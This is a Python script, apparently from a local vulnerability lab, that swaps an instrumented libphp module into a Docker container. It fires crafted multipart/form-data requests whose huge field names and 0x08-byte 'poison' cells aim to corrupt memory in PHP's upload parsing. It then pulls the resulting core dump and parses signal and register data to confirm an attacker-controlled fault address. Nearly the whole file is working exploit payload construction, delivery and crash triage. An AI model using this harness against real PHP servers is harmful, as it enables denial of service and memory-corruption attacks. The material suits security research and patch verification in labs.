#!/usr/bin/env python3
"""oom56: instrumented-module crash -> core -> si_addr forensics.
Swap instrumented libphp back in (crashes reproduce there), fire attacks,
wait for a NEW segv, docker cp the core, parse NT_SIGINFO si_addr +
NT_PRSTATUS regs. si_addr==0x0808080808080808 => poison-controlled fault."""
import re
import struct
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
NAMELEN = 3064
LIB = "/usr/lib/apache2/modules/libphp.so"


def sh(cmd, timeout=20, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def dcp(src, dst):
    return subprocess.run(["docker", "cp", src, dst], capture_output=True).returncode


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * 10237 + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=30):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin1", "replace")[:120]
    except Exception as e:
        return type(e).__name__, str(e)[:120]


def logs():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=90)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def parse_core(path):
    NT_PRSTATUS, NT_SIGINFO = 1, 0x53494749
    out = {}
    with open(path, "rb") as f:
        data = f.read()
    if data[4] != 2:
        return out
    e_phoff, = struct.unpack_from("<Q", data, 0x20)
    e_phentsize, e_phnum = struct.unpack_from("<HH", data, 0x36)
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        if struct.unpack_from("<I", data, off)[0] != 4:
            continue
        n_off, n_size = struct.unpack_from("<QQ", data, off + 0x20)
        pos, end = n_off, n_off + n_size
        while pos + 12 <= end:
            namesz, descsz, ntype = struct.unpack_from("<III", data, pos)
            pos += 12
            pos += (namesz + 3) // 4 * 4
            desc_off = pos
            pos += (descsz + 3) // 4 * 4
            if ntype == NT_PRSTATUS and descsz >= 136:
                regs = struct.unpack_from("<27Q", data, desc_off + 112)
                names = ["r15", "r14", "r13", "r12", "rbp", "rbx", "r11", "r10",
                         "r9", "r8", "rax", "rcx", "rdx", "rsi", "rdi",
                         "orig_ax", "rip", "cs", "eflags", "rsp", "ss"]
                out["regs"] = dict(zip(names, regs[:21]))
                out["pid"], = struct.unpack_from("<i", data, desc_off + 32)
            elif ntype == NT_SIGINFO and descsz >= 128:
                si_signo, si_errno, si_code = struct.unpack_from("<iii", data, desc_off)
                si_addr, = struct.unpack_from("<Q", data, desc_off + 16)
                out["siginfo"] = (si_signo, si_code, si_addr)
    return out


def main():
    print("=== swap instrumented module ===", flush=True)
    print(sh("md5sum %s | cut -c1-8" % LIB), "-> instr", flush=True)
    dcp("/tmp/libphp.so.instr", "php_vuln:" + LIB)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    probe = "?"
    for _ in range(20):
        time.sleep(1.5)
        c, probe = http("/oom_sapi.php", timeout=5)
        if c == 200:
            break
    print("[ini]", probe, flush=True)
    if "lim=20600000" not in probe:
        print("[ABORT]", flush=True)
        return
    base = len(re.findall(r"exit signal Segmentation", logs()))
    print("[baseline] segv=%d" % base, flush=True)

    att = build_attack()
    for i in range(8):
        code, text = http("/oom_mod.php", att,
                          "multipart/form-data; boundary=BOUND", 40)
        time.sleep(1.5)
        now = len(re.findall(r"exit signal Segmentation", logs()))
        print("  atk%d: %s segv=%d (new=%d)" % (i, code, now, now - base), flush=True)
        if now > base:
            break
        # interleave benign traffic (fresh allocations in poisoned children)
        for _ in range(3):
            http("/oom_mod.php",
                 b"--BOUND\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n1\r\n--BOUND--\r\n",
                 "multipart/form-data; boundary=BOUND", 15)
        if now > len(re.findall(r"exit signal Segmentation", logs())):
            break
    new = len(re.findall(r"exit signal Segmentation", logs())) - base
    print("[new segvs] %d" % new, flush=True)
    if not new:
        print("[VERDICT] no crash this round", flush=True)
    else:
        print("=== core hunt ===", flush=True)
        corep = None
        for _ in range(3):
            ls = sh("ls /tmp/core* 2>/dev/null", 15, retries=1)
            if ls.startswith("/tmp/core"):
                corep = ls.split()[0]
                break
            time.sleep(2)
        if not corep:
            print("[NO CORE] listing:", sh("ls -la /tmp | head -8", 15), flush=True)
            return
        print("[core]", corep, sh("ls -la %s" % corep, 15), flush=True)
        dcp("php_vuln:" + corep, "/tmp/phplab/child.core")
        info = parse_core("/tmp/phplab/child.core")
        si = info.get("siginfo", (0, 0, 0))
        addr = si[2]
        print("[siginfo] signo=%s code=%s si_addr=0x%x" % si)
        print("[crashed pid]", info.get("pid"))
        for k in ("rip", "rdi", "rsi", "rax", "rsp"):
            print("  %s=0x%x" % (k, info.get("regs", {}).get(k, 0)))
        poison = (addr & 0xFFFFFFFFFFFFFFFF) in (
            0x808080808080808, 0x0808080808080808) or (addr & 0xFFFFFFFF) == 0x08080808
        print("[VERDICT] poison_fault=%s si_addr=0x%x" % (poison, addr), flush=True)
    # leave instrument in place; report module state
    print("[module left]", "instrumented", flush=True)


if __name__ == "__main__":
    main()
